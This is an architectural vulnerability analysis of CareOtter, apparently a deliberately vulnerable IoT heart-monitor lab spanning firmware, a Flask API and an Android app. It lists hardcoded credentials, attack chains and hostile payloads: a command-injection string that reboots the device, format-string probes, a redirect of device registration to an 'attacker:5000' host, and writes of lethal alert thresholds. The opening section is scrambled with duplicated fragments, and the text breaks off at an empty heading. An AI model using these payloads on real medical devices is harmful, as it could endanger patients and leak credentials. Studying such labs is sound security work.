# CareOtter — Complete Architectural Analysis

> **Date:** 2026-05-02  
> **Scope:** Source code for all components (IoT firmware, Cloud API, Android app)  
> **Objective:** Understand how data flows, how actors authenticate, and where the architectural vulnerabilities reside.
    ├──► BLE scan -> discovers CareOtter_HR
    │     ├── Reads ManufacturerData -> obtains Cloud API IP + device WiFi IP
    │     └── Enumerates GATT services -> discovers 0xFF10 (not advertised)
## 1. Component Overview
    ├──► Connect GATT -> no pairing required
```
    ├──► Write 0xFF12: "6767" -> PIN accepted
│                              ANDROID APP (Patient / Admin)                    │
    ├──► Read 0xFF11 -> obtains wifi_ssid, wifi_psk, cloud_url in plaintext
│  │LoginActivity │  │MainActivity  │  │AdminActivity │  │BleMonitorClient │  │
    │     -> careservice executes: uci set wireless...@wifi-iface[0].ssid='...' && ...
    │     -> VULN: shell injection if SSID/PSK contain metacharacters
│         │                 │                  │                                │
    │     -> ble_server.py updates cloud_url and triggers _send_registration_to_cloud()
    │     -> POST to http://attacker:5000/admin/device/register with signature + credentials
    │     -> VULN: SSRF - the device sends sensitive data to any URL
      │                 │                  │
    │     -> rm -f /etc/config/wireless && cp /rom/etc/config/wireless ...
    │     -> No confirmation, no re-authentication
│        CLOUD API (Docker :5002)     │     CAREOTTER DEVICE (RPi 192.168.2.1)  │
    └──► Write 0xFF01 (CSCP v1 packet with stolen key)
         -> Changes thresholds to lethal values (bpm_min=0, bpm_max=255, spo2_min=0)
         -> The device accepts without validation
│  │  ├─ DeviceService          │─────┼──►│  TCP :9999  │  │  BLE peripheral  │ │
│  │  │   └─ IGPClient           │     │  └─────────────┘  └────────┬─────────┘ │
│  │  ├─ VitalsService          │     │         ▲                   │           │
│  │  │   └─ HTTP :8081 direct   │◄────┼─────────┘                   │           │
    ├──► 0x02 AUTHENTICATE payload="OtterMobile2026"
    │     -> authenticated = 1 (global for the ENTIRE process)
│  │       ├─ devices (MAC)      │     │                    │  HTTP :8081      │ │
    ├──► 0x03 GET_NETWORK -> returns the full /etc/config/wireless (with PSK)
│  │       └─ device_config      │     │                    │  ├─ /thresholds  │ │
    ├──► 0x05 VERIFY_STATUS payload="%x.%x.%x" -> format string leak
│                                     │                    └──────────────────┘ │
    ├──► 0x06 SET_WIFI payload="SSID|PSK" -> shell injection
      ▲
    ├──► 0x0B DEFIBRILLATE payload="%x.%x.%x" -> format string in events.log
      │  {signature, mac, patient{}, admin{}, device_ip}
    ├──► 0x0C EMERGENCY_ALERT payload="test'; reboot #" -> command injection -> reboot
      └──────────────────────────────┐
    └──► 0x0D DEAUTHENTICATE -> authenticated = 0
                  ┌──────────▼──────────┐
                  │   ATTACKER SERVER   │
                  └─────────────────────┘
```

    ├──► POST /api/auth/login -> JWT

    │     -> Cloud API does: auth -> 0x03 -> deauth to the device
    │     -> Returns WiFi config (field `raw` with PSK if VULNERABLE=1)
### 2.1 Services Running on the Device
    │     -> Cloud API does: auth -> 0x06 -> deauth
| Service | Port | Protocol | Language | Start |
    │     -> Cloud API does: auth -> 0x04 -> deauth
    │     -> VULN: TLV underflow proxy
| `sensor_service.py` | 8081 | HTTP/JSON (TCP) | Python 3 | `/etc/init.d/medical-sensor` |
         -> Cloud API does: auth -> 0x09 -> deauth

All listen on `0.0.0.0` (all interfaces), so they are reachable over both Ethernet (`192.168.2.1`) and WiFi (when configured).

│   or Sim     │                 │  :8081           │

                                          │ HTTP /vitals ( every 10s )

                                   │ vitals_snapshot (frozen every 10s)
- **`sensor_loop` thread**: reads from the I2C bus (real or simulated) every 100ms. In simulated mode it generates random values around 72 BPM / 98% SpO2.
            │ BLE notify   │
            │ (every 2s)   │

**HTTP endpoints (:8081):**

| Method | Path | Auth | Function |
|--------|------|------|---------|
| GET | `/vitals` | ✅ `X-API-Key` | BPM/SpO2 snapshot |
| GET | `/health` | ❌ No | Liveness probe (returns plain `ok`) |
| GET | `/log` | ✅ `X-API-Key` | Full in-memory vitals buffer |
| GET | `/config` | ✅ `X-API-Key` | Service config (incl. `api_key`, `cloud_endpoint`, `cloud_token`) |
| GET | `/alerts` | ✅ `X-API-Key` | Alert state vs current thresholds |
| GET | `/history?minutes=N` | ✅ `X-API-Key` | Filtered history (no validation of N) |
| POST | `/thresholds` | ✅ `X-API-Key` | Changes alert thresholds (JSON body) |

**Key architectural vulnerabilities:**
1. **Hardcoded API token + `==` comparison**: `API_KEY` is loaded from `config.json` (default `careotter-2024-lab`) and checked with a plain Python `==`, exposing a timing side-channel (CWE-208).
2. **`/history?minutes=99999`**: there is no upper bound on the `minutes` parameter; an authenticated caller can drain the whole 1440-entry buffer in one request.
3. **401 `hint` field leaks header name**: any probe of a protected endpoint (`/config`, `/vitals`, …) returns `{"error":"unauthorized","hint":"X-API-Key header required"}`, telling the attacker exactly which header to hunt for (CWE-200).
4. **`/config` echoes the token after auth**: once the header is supplied, the response includes the `api_key` field verbatim — useful to confirm token rotation, useless from a defence standpoint.

### 2.3 `ble_server.py` — BLE GATT Server

**Role:** Exposes sensor data as a BLE peripheral called `CareOtter_HR`.

**Stack:** `dbus-fast` on top of BlueZ system D-Bus. It does not use `pygatt` or `bleak` on the server side.

**Published GATT services:**

| UUID | Service | Characteristics | Security |
|------|----------|-----------------|-----------|
| `0x180D` | Heart Rate | `0x2A37` (notify) | ❌ None |
| `0x1822` | Pulse Oximeter | `0x2A5F` (notify) | ❌ None |
| `0x180F` | Battery | `0x2A19` (read) | ❌ None |
| `0x180A` | Device Info | `0x2A29`, `0x2A24` (read) | ❌ None |
| `0xFF00` | Alert Threshold | `0xFF01` (read/write/notify) | ❌ None |
| `0xFF10` | Factory Provisioning (hidden) | `0xFF11`, `0xFF12` | ❌ None |

**BLE data flow:**
```
sensor_service.py :8081/vitals  ──(urllib)──►  ble_server.py latest_vitals cache
                              │
                              ▼ (every 2s)
                          HeartRateMeasurementChrc.update_and_notify()
                              │
                          _notify_characteristic() ──D-Bus──► BlueZ
                              │
                          PulseOximeterChrc.update_and_notify()
                              │
                          AlertThresholdChrc.update_and_notify()
```

**Characteristic `0xFF01` — CSCP v1 (CareOtter Secure Config Protocol):**
- 24-byte packet format: `Magic(4) + CRC32(4) + AES-128-ECB(ciphertext, 16)`
- Hardcoded key: `careotter-key-16` (identical in firmware and APK)
- **No clinical range validation**: accepts `bpm_min=0, bpm_max=255, spo2_min=0`
- **Design bug**: `_alert_bpm_window` is recalculated without validating that `bpm_max > bpm_min`. If `bpm_min >= bpm_max` is sent, the denominator becomes <=0 and `update_and_notify()` throws `ZeroDivisionError`, killing the BLE notification loop.

**Characteristic `0xFF11` — Provisioning Config:**
- Accepts JSON commands without verifying whether the PIN was validated first (`authenticated` from `0xFF12` is ignored).
- Available commands: `wifi_set`, `wifi_get`, `cloud_set`, `cloud_get`, `patient_set`, `admin_set`, `factory_reset`, `reboot`
- `wifi_set` injects SSID/PSK directly into `os.system()` -> **shell injection**.
- `cloud_set` accepts any URL -> **SSRF** (the device will send its signature and credentials to that URL).
- `factory_reset` runs with a single write, without confirmation.
- `ReadValue` returns `wifi_psk` in plaintext -> **information disclosure**.

**Characteristic `0xFF12` — Provisioning Auth:**
- Hardcoded factory PIN: `6767`
- There is no rate limiting or permanent lockout.
- The PIN authentication state is **not consulted** before executing commands in `0xFF11`.

**Advertising ManufacturerData (0x08D4):**
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              ANDROID APP (Patient / Admin)                    │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌─────────────────┐  │
│  │LoginActivity │  │MainActivity  │  │AdminActivity │  │BleMonitorClient │  │
│  │  HTTP :5002  │  │  BLE GATT    │  │  TCP :9999   │  │  (BLE stack)   │  │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘  └─────────────────┘  │
│         │                 │                  │                                │
│         │ JWT (Bearer)    │ Raw BLE         │ IGP v4 binary                  │
│         │ plain HTTP      │ no encryption   │ plain TCP                      │
└─────────┼─────────────────┼──────────────────┼────────────────────────────────┘
          │                 │                  │
          ▼                 │                  ▼
┌───────────────────────────┘         ┌─────────────────────────────────────────┐
│        CLOUD API (Docker :5002)     │     CAREOTTER DEVICE (RPi 192.168.2.1)  │
│  ┌────────────────────────────┐     │  ┌─────────────┐  ┌──────────────────┐ │
│  │  Flask app.py              │◄────┼──│  careservice│  │  ble_server.py   │ │
│  │  ├─ JWTService (HS256)     │     │  │  (C binary) │  │  (dbus-fast)     │ │
│  │  ├─ DeviceService          │─────┼──►│  TCP :9999  │  │  BLE peripheral  │ │
│  │  │   └─ IGPClient           │     │  └─────────────┘  └────────┬─────────┘ │
│  │  ├─ VitalsService          │     │         ▲                   │           │
│  │  │   └─ HTTP :8081 direct   │◄────┼─────────┘                   │           │
│  │  └─ DatabaseService (SQLite)│     │                    ┌────────▼─────────┐ │
│  │       ├─ users (SHA-256)    │     │                    │ sensor_service.py│ │
│  │       ├─ devices (MAC)      │     │                    │  HTTP :8081      │ │
│  │       ├─ vitals_readings    │     │                    │  ├─ /vitals      │ │
│  │       └─ device_config      │     │                    │  ├─ /thresholds  │ │
│  └────────────────────────────┘     │                    │  └─ /log         │ │
│                                     │                    └──────────────────┘ │
└─────────────────────────────────────┘─────────────────────────────────────────┘
          ▲
          │  POST /admin/device/register
          │  {signature, mac, patient{}, admin{}, device_ip}
          │
          └──────────────────────────────┐
                                         │
                              ┌──────────▼──────────┐
                              │   ATTACKER SERVER   │
                              │  (fake cloud API)   │
                              └─────────────────────┘
```

---

## 2. IoT Device — Firmware on the Raspberry Pi

### 2.1 Services Running on the Device

| Service | Port | Protocol | Language | Start |
|----------|--------|-----------|----------|--------|
| `careservice` | 9999 | IGP v4 binario (TCP) | C | `/etc/init.d/careservice` |
| `sensor_service.py` | 8081 | HTTP/JSON (TCP) | Python 3 | `/etc/init.d/medical-sensor` |
| `ble_server.py` | — | BLE GATT (D-Bus) | Python 3 | `/etc/init.d/ble-server` |

All listen on `0.0.0.0` (all interfaces), so they are reachable over both Ethernet (`192.168.2.1`) and WiFi (when configured).

### 2.2 `sensor_service.py` — The Simulated Medical Sensor

**Role:** Generates BPM/SpO2 readings and exposes them over HTTP.

**Internal architecture:**
- **`sensor_loop` thread**: reads from the I2C bus (real or simulated) every 100ms. In simulated mode it generates random values around 72 BPM / 98% SpO2.
- **`snapshot_loop` thread**: freezes a copy of `latest` every 10s in `vitals_snapshot`. All consumers (HTTP, BLE) read this snapshot, not the real-time value.
- **Circular log buffer**: `log_buffer` keeps up to 1440 entries (~24h). Entries are summaries every 60s with averages, minimums, and maximums.

**Endpoints HTTP (:8081):**

| Method | Path | Auth | Function |
|--------|------|------|---------|
| GET | `/vitals` | ✅ `X-API-Key` | BPM/SpO2 snapshot |
| GET | `/health` | ❌ No | Liveness probe (returns plain `ok`) |
| GET | `/log` | ✅ `X-API-Key` | Full in-memory vitals buffer |
| GET | `/config` | ✅ `X-API-Key` | Service configuration (includes `api_key`, `cloud_endpoint`, `cloud_token`) |
| GET | `/alerts` | ✅ `X-API-Key` | Alert state vs current thresholds |
| GET | `/history?minutes=N` | ✅ `X-API-Key` | Filtered history (no validation of N) |
| POST | `/thresholds` | ✅ `X-API-Key` | Changes alert thresholds (JSON body) |

**Key architectural vulnerabilities:**
1. **Hardcoded API token + `==` comparison**: `API_KEY` is loaded from `config.json` (default `careotter-2024-lab`) and checked with a plain Python `==`, exposing a timing side-channel (CWE-208).
2. **`/history?minutes=99999`**: there is no upper bound on the `minutes` parameter; an authenticated caller can drain the whole 1440-entry buffer in one request.
3. **401 `hint` field leaks the header name**: any probe of a protected endpoint (`/config`, `/vitals`, …) returns `{"error":"unauthorized","hint":"X-API-Key header required"}`, telling the attacker exactly which header to hunt for (CWE-200).
4. **`/config` echoes the token after auth**: once the header is supplied, the response includes the `api_key` field verbatim — useful to confirm token rotation, useless from a defensive standpoint.

### 2.3 `ble_server.py` — BLE GATT Server

**Role:** Exposes sensor data as a BLE peripheral called `CareOtter_HR`.

**Stack:** `dbus-fast` on top of BlueZ system D-Bus. It does not use `pygatt` or `bleak` on the server side.

**Published GATT services:**

| UUID | Service | Characteristics | Security |
|------|----------|-----------------|-----------|
| `0x180D` | Heart Rate | `0x2A37` (notify) | ❌ None |
| `0x1822` | Pulse Oximeter | `0x2A5F` (notify) | ❌ None |
| `0x180F` | Battery | `0x2A19` (read) | ❌ None |
| `0x180A` | Device Info | `0x2A29`, `0x2A24` (read) | ❌ None |
| `0xFF00` | Alert Threshold | `0xFF01` (read/write/notify) | ❌ None |
| `0xFF10` | Factory Provisioning (hidden) | `0xFF11`, `0xFF12` | ❌ None |

**BLE data flow:**
```
sensor_service.py :8081/vitals  ──(urllib)──►  ble_server.py latest_vitals cache
                                                      │
                                                      ▼ (every 2s)
                                              HeartRateMeasurementChrc.update_and_notify()
                                                      │
                                              _notify_characteristic() ──D-Bus──► BlueZ
                                                      │
                                              PulseOximeterChrc.update_and_notify()
                                                      │
                                              AlertThresholdChrc.update_and_notify()
```

**Characteristic `0xFF01` — CSCP v1 (CareOtter Secure Config Protocol):**
- 24-byte packet format: `Magic(4) + CRC32(4) + AES-128-ECB(ciphertext, 16)`
- Hardcoded key: `careotter-key-16` (identical in firmware and APK)
- **No clinical range validation**: accepts `bpm_min=0, bpm_max=255, spo2_min=0`
- **Design bug**: `_alert_bpm_window` is recalculated without validating that `bpm_max > bpm_min`. If `bpm_min >= bpm_max` is sent, the denominator becomes <=0 and `update_and_notify()` throws `ZeroDivisionError`, killing the BLE notification loop.

**Characteristic `0xFF11` — Provisioning Config:**
- Accepts JSON commands without verifying whether the PIN was validated first (`authenticated` from `0xFF12` is ignored).
- Available commands: `wifi_set`, `wifi_get`, `cloud_set`, `cloud_get`, `patient_set`, `admin_set`, `factory_reset`, `reboot`
- `wifi_set` injects SSID/PSK directly into `os.system()` -> **shell injection**.
- `cloud_set` accepts any URL -> **SSRF** (the device will send its signature and credentials to that URL).
- `factory_reset` runs with a single write, without confirmation.
- `ReadValue` returns `wifi_psk` in plaintext -> **information disclosure**.

**Characteristic `0xFF12` — Provisioning Auth:**
- Hardcoded factory PIN: `6767`
- There is no rate limiting or permanent lockout.
- The PIN authentication state is **not consulted** before executing commands in `0xFF11`.

**Advertising ManufacturerData (0x08D4):**
- 10 binary bytes: `[API_WiFi_IP(4)] + [API_Port(2)] + [Device_WiFi_IP(4)]`
- Any passive BLE scanner can read the Cloud API IP and the device WiFi IP without pairing.

### 2.4 `careservice.c` — Binary Administration Service (IGP v4)

**Role:** Administration gateway for the device. Exposes a proprietary binary protocol.

**Protocol format:**
```
Header (8 bytes, big-endian):
  Magic    : 0x43415245 ("CARE")
  Cmd      : 1 byte
    Status   : 1 byte (always 0x00 in request)
    Len      : 2 bytes (payload length)
```

**Critical global state:**
```c
int authenticated = 0;   // Persists across TCP connections!
```
This flag is **global to the process**, not tied to the socket. If one client authenticates on any connection, all later clients inherit `authenticated=1` until someone sends `0x0D DEAUTHENTICATE` or the process is restarted.

**IGP commands:**

| Cmd | Name | Auth | Function | Vulnerability |
|-----|--------|------|---------|----------------|
| `0x01` | SYS_INFO | ❌ | Kernel and architecture | — |
| `0x02` | AUTHENTICATE | ❌ | Validates `OtterMobile2026` | Hardcoded credential (CWE-798) |
| `0x03` | GET_NETWORK | ✅ | Returns `/etc/config/wireless` | WiFi PSK in plaintext |
| `0x04` | SET_PREFS | ✅ | Preferences TLV parser | Integer underflow -> BOF |
| `0x05` | VERIFY_STATUS | ❌ | Subsystem diagnostics | Format string (snprintf with payload as format) |
| `0x06` | SET_WIFI | ✅ | Configures WiFi via UCI | Shell injection |
| `0x07` | GET_VITALS | ❌ | Proxies sensor `/vitals` | — |
| `0x08` | SET_THRESHOLD | ✅ | Clinical thresholds via TLV | — |
| `0x09` | REBOOT_SERVICE | ✅ | Restarts init.d service | Zombie processes (no waitpid) |
| `0x0A` | GET_LOG | ✅ | Last 512 bytes of log | — |
| `0x0B` | DEFIBRILLATE | ✅ | Simulates 200J shock | Format string in event log |
| `0x0C` | EMERGENCY_ALERT | ✅ | Sends alert via curl | OS command injection |
| `0x0D` | DEAUTHENTICATE | ❌ | Resets `authenticated=0` | — |

**Critical C vulnerabilities:**
1. **`parse_preferences()` (0x04)**: `remaining -= 2` can underflow if `data_len` is inconsistent. Then `memcpy(local_store, ..., t_len)` with `t_len > 128` -> stack buffer overflow.
2. **`get_system_status()` (0x05)**: `snprintf(report_header, 128, module_name)` uses the payload as the format string -> format string leak.
3. **DEFIBRILLATE (0x0B)**: `snprintf(fmt_buf, sizeof(fmt_buf), (char*)payload)` -> second format-string sink. Writes to `/tmp/careotter_events.log`.
4. **EMERGENCY_ALERT (0x0C)**: `snprintf(cmd, ..., "curl ... '%s'", payload)` -> command injection. Example: `payload = "test'; reboot #"` reboots the device.
5. **REBOOT_SERVICE (0x09)**: `fork()` without `waitpid()` -> zombie processes.

---

## 3. Cloud API — Flask (Docker :5002)

### 3.1 Internal Architecture

```
HTTP Client
    │
    ▼
Flask app.py ──┬──► @token_required (decoradores.py)
               │         └── JWTService.decode_token()
               │               └── jwt.decode(secret='careotter_jwt_2026')
               │
               ├──► DeviceService ──► IGPClient ──► TCP 192.168.2.1:9999
               │
               ├──► VitalsService ──► HTTP 192.168.2.1:8081/vitals
               │
               └──► DatabaseService ──► SQLite (/app/data/careotter.db)
```

### 3.2 Authentication in the Cloud API

**Login flow:**
```
POST /api/auth/login
Body: {"username": "admin", "password": "CareOtter2026!"}

1. DatabaseService.verify_user() -> SHA-256(password) == password_hash
2. JWTService.generate_token() -> JWT HS256 signed with 'careotter_jwt_2026'
3. Response: {"token": "eyJ...", "role": "admin", ...}
```

**Issues:**
- **Unsalted SHA-256**: `hashlib.sha256(password.encode()).hexdigest()`. Rainbow tables work directly.
- **Weak JWT secret**: `'careotter_jwt_2026'` is short and predictable. `jwt_tool` or `hashcat` crack it in seconds.
- **Distinct error messages**: the `@token_required` decorator distinguishes "Token expired" vs "Invalid signature" vs "Malformed token", making brute-force attacks against the signature easier.

**Roles:**
- `admin`: access to `/admin/*`, `/api/devices`, `/api/network`, etc.
- `patient`: access to `/patient/*`, `/api/devices/me`, `/api/vitals`

**Authorization failure (API-06):** The `/api/devices` endpoint (GET lists all devices) requires `@token_required` but **does not verify the role**. An authenticated patient can obtain the full list.

### 3.3 Endpoints clave

| Endpoint | Auth | IGP Cmd | Vuln |
|----------|------|---------|------|
| `/api/device/status?module=X` | ❌ No | `0x05` | Format string proxy (X=%x.%x.%x) |
| `/api/network` | ✅ JWT | `0x03` | Returns `raw` field with PSK when vuln=1 |
| `/api/config/preferences` | ✅ JWT | `0x04` | TLV underflow proxy |
| `/api/services/restart` | ✅ JWT | `0x09` | Service restart |
| `/api/vitals` | ❌ No | — | Shared cache (identical readings for everyone) |
| `/hint` | ❌ No | — | Information disclosure (guides toward BLE provisioning) |
| `/admin/device/register` | ❌ No | — | Registration by hardcoded signature |
| `/initialize_iot` | ❌ No | — | **Out of scope** — playability fallback that creates default users. Not part of attack chains. |

**`VULNERABLE` mode (env var):**
- `VULNERABLE=1`: `debug=True` in Flask -> **Werkzeug debugger exposed** (potential RCE if the PIN is guessed).
- `VULNERABLE=1`: 500 errors return `type(e).__name__` and `str(e)`.
- `VULNERABLE=0`: hides `raw` fields, forces `CareOtter` module, disables debug.

### 3.4 Dynamic Device Registration

**Normal flow (Chain F):**
```
1. Attacker discovers BLE hidden service 0xFF10
2. Writes PIN 6767 to 0xFF12 -> authenticated=true
3. Writes {"cmd":"cloud_set","url":"http://attacker:5000"} to 0xFF11
4. ble_server.py calls _send_registration_to_cloud()
5. POST http://attacker:5000/admin/device/register
   Body: {"signature":"9C0C306DEF2A", "mac":"AA:BB:...", 
          "patient":{...}, "admin":{...}, "device_ip":"..."}
6. Attacker captures the signature and credentials
7. Replay to the real Cloud API: POST http://192.168.2.2:5002/admin/device/register
```

**Fallback (`/initialize_iot`) — Out of Scope:**
> This is a **lab playability fallback**, not an attack surface. It represents Phase 2 (post-provisioning operational mode) and is excluded from the CareOtter attack playbook and vulnerability checklist.

- If the database is empty (0 users), anyone can call `GET /initialize_iot`
- Creates: `admin/CareOtter2026!` + `patient/patient123`
- Registers dummy device `AA:BB:CC:DD:EE:FF`

See `CareOtter.md` → *Lab Scope and Phases* for the formal boundary definition.

### 3.5 Vitals collector (background thread)

```python
def _vitals_collector():
    while True:
        if not Config.DEVICE_IP:
            sleep(10); continue
        result = vitals.get_current()   # HTTP GET /vitals
        if result['success']:
            db.store_vitals(data, device_mac=DEVICE_MAC)
            sleep_until(next_snapshot_boundary)  # aligns with the sensor snapshot
```

- Runs as `daemon=True` inside the same Flask process.
- If `DEVICE_IP` changes (after `/admin/device/register`), the collector automatically starts polling the new WiFi IP instead of Ethernet.

---

## 4. Android Application — `vulnzoo_apps/careotter_app`

### 4.1 Java Components

| Class | Role | Channel |
|-------|-----|-------|
| `LoginActivity` | Auth against Cloud API | Plain HTTP :5002 |
| `MainActivity` | Patient BLE monitor | BLE GATT |
| `AdminActivity` | Admin panel via IGP v4 | Plain TCP :9999 |
| `BleMonitorClient` | Android BLE wrapper | BLE GATT |
| `IgpClient` | Binary IGP v4 client | Plain TCP :9999 |
| `CareOtterConfig` | CSCP v1 packet builder | — |
| `VitalsLogger` | Log to /sdcard | Filesystem |

### 4.2 Authentication Flow in the App

```
LoginActivity
    │
    ├──► Detects WiFi prefix (e.g. 192.168.2.)
    ├──► User enters the last octet (e.g. 2)
    ├──► Builds URL: http://192.168.2.2:5002
    │
    ├──► POST /api/auth/login
    │     Body: {"username":"...", "password":"..."}
    │
    ├──► Receives JWT + role
    │
    ├──► Stores in SharedPreferences (unencrypted):
    │     jwt_token, user_role, username, api_url, api_prefix, api_host
    │
    └──► routeByRole(role):
         "admin" → AdminActivity
         else    → MainActivity
```

**Mobile vulnerabilities:**
1. **HTTP without TLS**: credentials and JWT travel in plaintext.
2. **JWT in SharedPreferences**: any app with filesystem access can read `careotter_prefs.xml`.
3. **No certificate pinning**: an attacker controlling the network (ARP spoofing) can intercept traffic.

### 4.3 MainActivity — Patient Mode (BLE)

```
MainActivity (implements BleMonitorClient.Listener)
    │
    ├──► startScan() -> looks for "CareOtter_HR" by name
    │     VULN: does not verify MAC, does not require pairing
    │     Any BLE device with that name is accepted
    │
    ├──► onServicesDiscovered():
    │     ├── subscribe HR (0x2A37) notify
    │     ├── subscribe PLX (0x2A5F) notify
    │     ├── read Manufacturer (0x2A29)
    │     ├── read Model (0x2A24)
    │     └── if PROV_SERVICE exists -> read PROV_CONFIG
    │
    ├──► onCharacteristicChanged(HR) -> update BPM UI
    ├──► onCharacteristicChanged(PLX) -> update SpO2 UI
    │
    ├──► VitalsLogger.log(bpm, spo2) -> /sdcard/careotter_vitals.log
    │     VULN: plaintext, world-readable on Android <10
    │
        └──► Hidden diagnostic panel: 5 quick taps on the title
            └── Allows reading/writing raw thresholds in 0xFF01
```

**BLE vulnerabilities in the app:**
1. **Missing BLE pairing (M3/CWE-306)**: `connectGatt(context, false, callback)` without `TRANSPORT_LE` or bonding.
2. **No MAC verification**: it only compares `device.getName().equals("CareOtter_HR")`.
3. **Unencrypted channel (M5/CWE-319)**: it does not request BLE encryption (`setPairing` is not forced).
4. **Plaintext external storage (M2/CWE-276)**: `VitalsLogger` writes to `/sdcard/careotter_vitals.log`.
5. **Hidden diagnostic panel (M1)**: discoverable by static analysis (variable `diagTapCount`).
6. **Threshold write without validation (M3/M7)**: `writeThreshold(String rawJson)` sends bytes as-is to GATT.

### 4.4 AdminActivity — Administrator Mode (IGP v4)

```
AdminActivity
    │
    ├──► StrictMode.permitNetwork() -> network on UI thread (intentional vuln)
    │
    ├──► Public commands (no auth):
    │     ├── sysInfo()        -> IGP 0x01
    │     ├── verifyStatus()   -> IGP 0x05
    │     └── exploitFormatString() -> verifyStatus("%x.%x.%x.%x")
    │
    ├──► Protected commands (execProtected: auth -> cmd -> deauth):
    │     ├── getNetwork()     -> IGP 0x03
    │     ├── exploitUnderflow() -> IGP 0x04
    │     ├── defibrillate()   -> IGP 0x0B
    │     ├── exploitCommandInjection() -> IGP 0x0C
    │     └── setTheme()       -> IGP 0x04
    │
        └──► execProtected() opens 3 separate TCP connections
            VULN: the window between auth and deauth is exploitable
```

**Admin mode vulnerabilities:**
1. **StrictMode network on the main thread**: the UI freezes, but more importantly network exceptions can crash the app.
2. **XOR-obfuscated token**: `IgpClient.decodeToken()` applies XOR 0x5A to hardcoded bytes. The real token is `OtterMobile2026`.
3. **IGP v4 in plaintext**: TCP without TLS or certificates.

### 4.5 `CareOtterConfig` — CSCP v1

```java
// Hardcoded key in Java (identical to ble_server.py)
private static final byte[] CSCP_KEY = "careotter-key-16".getBytes(StandardCharsets.UTF_8);

// ECB mode (no IV) -> deterministic, vulnerable to replay
Cipher.getInstance("AES/ECB/NoPadding");
```

**Impact:** An attacker who extracts this class from the APK (via `jadx` or `strings`) can forge valid CSCP v1 packets and write lethal thresholds to the device without pairing.

---

## 5. Administration Flows

### 5.1 BLE Administration (Factory Provisioning)

```
Attacker (with BLE proximity)
    │
    ├──► Scan BLE -> discovers CareOtter_HR
    │     ├── Reads ManufacturerData -> obtains Cloud API IP + device WiFi IP
    │     └── Enumerates GATT services -> discovers 0xFF10 (not advertised)
    │
    ├──► Connect GATT -> no pairing required
    │
    ├──► Write 0xFF12: "6767" -> PIN accepted
    │
    ├──► Read 0xFF11 -> obtains wifi_ssid, wifi_psk, cloud_url in plaintext
    │
    ├──► Write 0xFF11: {"cmd":"wifi_set","ssid":"...","psk":"..."}
    │     -> careservice executes: uci set wireless...@wifi-iface[0].ssid='...' && ...
    │     -> VULN: shell injection if SSID/PSK contain metacharacters
    │
    ├──► Write 0xFF11: {"cmd":"cloud_set","url":"http://attacker:5000"}
    │     -> ble_server.py updates cloud_url and triggers _send_registration_to_cloud()
    │     -> POST to http://attacker:5000/admin/device/register with signature + credentials
    │     -> VULN: SSRF - the device sends sensitive data to any URL
    │
    ├──► Write 0xFF11: {"cmd":"factory_reset"}
    │     -> rm -f /etc/config/wireless && cp /rom/etc/config/wireless ...
    │     -> No confirmation, no re-authentication
    │
        └──► Write 0xFF01 (CSCP v1 packet with stolen key)
            -> Changes thresholds to lethal values (bpm_min=0, bpm_max=255, spo2_min=0)
            -> The device accepts without validation
```

### 5.2 IGP v4 Administration (TCP :9999)

```
AdminActivity or direct attacker
    │
    ├──► TCP connect 192.168.2.1:9999
    │
    ├──► 0x02 AUTHENTICATE payload="OtterMobile2026"
    │     -> authenticated = 1 (global for the ENTIRE process)
    │
    ├──► 0x03 GET_NETWORK -> returns the full /etc/config/wireless (with PSK)
    │
    ├──► 0x05 VERIFY_STATUS payload="%x.%x.%x" -> format string leak
    │
    ├──► 0x06 SET_WIFI payload="SSID|PSK" -> shell injection
    │
    ├──► 0x0B DEFIBRILLATE payload="%x.%x.%x" -> format string in events.log
    │
    ├──► 0x0C EMERGENCY_ALERT payload="test'; reboot #" -> command injection -> reboot
    │
    └──► 0x0D DEAUTHENTICATE → authenticated = 0
```

**Architectural vulnerability (IGP-06):**
An attacker scanning port 9999 can wait for the Cloud API (or a legitimate admin) to send `0x02 AUTHENTICATE`, and in the window between that command and `0x0D DEAUTHENTICATE`, the attacker connects and executes protected commands without credentials.

### 5.3 Cloud API Administration (HTTP :5002)

```
Web browser / Mobile app / curl
    │
    ├──► POST /api/auth/login → JWT
    │
    ├──► GET /api/network (token_required)
    │     -> Cloud API does: auth -> 0x03 -> deauth to the device
    │     -> Returns WiFi config (field 'raw' with PSK if VULNERABLE=1)
    │
    ├──► POST /api/network/wifi (token_required)
    │     → Body: {"ssid":"...", "password":"..."}
    │     -> Cloud API does: auth -> 0x06 -> deauth
    │
    ├──► POST /api/config/preferences (token_required)
    │     → Body: {"tlv_hex": "AAFF4461726B"}
    │     -> Cloud API does: auth -> 0x04 -> deauth
    │     -> VULN: TLV underflow proxy
    │
    └──► POST /api/services/restart (token_required)
         → Body: {"service": "medical-sensor"}
         -> Cloud API does: auth -> 0x09 -> deauth
```

---

## 6. Vitals Data Flow (End-to-End)

```
┌──────────────┐     I2C/Sim     ┌──────────────────┐
│ MAX30102 HW  │◄───────────────►│ sensor_service.py│
│  or Simulator│                 │  :8081           │
└──────────────┘                 └────────┬─────────┘
                                          │ HTTP /vitals (every 10s)
                                          ▼
                                   ┌──────────────┐
                                   │ vitals_snapshot (frozen every 10s)
                                   └──────┬───────┘
                                          │
                    ┌─────────────────────┼─────────────────────┐
                    │                     │                     │
                    ▼                     ▼                     ▼
            ┌──────────────┐      ┌──────────────┐      ┌──────────────┐
            │ Cloud API    │      │ ble_server.py│      │ IGP 0x07     │
            │ collector    │      │ latest_vitals│      │ GET_VITALS   │
            │ (HTTP :8081) │      │ cache (30s)  │      │ (TCP :9999)  │
            └──────┬───────┘      └──────┬───────┘      └──────────────┘
                   │                     │
                   ▼                     ▼
            ┌──────────────┐      ┌──────────────┐
            │ SQLite DB    │      │ BLE notify   │
            │ (Docker)     │      │ (every 2s)   │
            └──────┬───────┘      └──────┬───────┘
                   │                     │
                   ▼                     ▼
            ┌──────────────┐      ┌──────────────┐
            │ Web Dashboard│      │ Android App  │
            │ /history     │      │ MainActivity │
            └──────────────┘      └──────────────┘
```

**Key points of the flow:**
1. The sensor generates data every 100ms, but the **snapshot freezes every 10s**. This means all consumers see the same value for 10s, regardless of when they query.
2. The BLE server refreshes its cache every 30s (`_vitals_refresh_interval`), but GATT notifications are emitted every 2s (`update_loop`). Notifications repeat the same value until the cache refreshes.
3. The Cloud API collector persists each successful reading in SQLite. The web history comes from the DB, not directly from the device.

---

## 7. Design Architectural Vulnerabilities

### 7.1 Global Authentication in Process (CWE-362 / CWE-613)

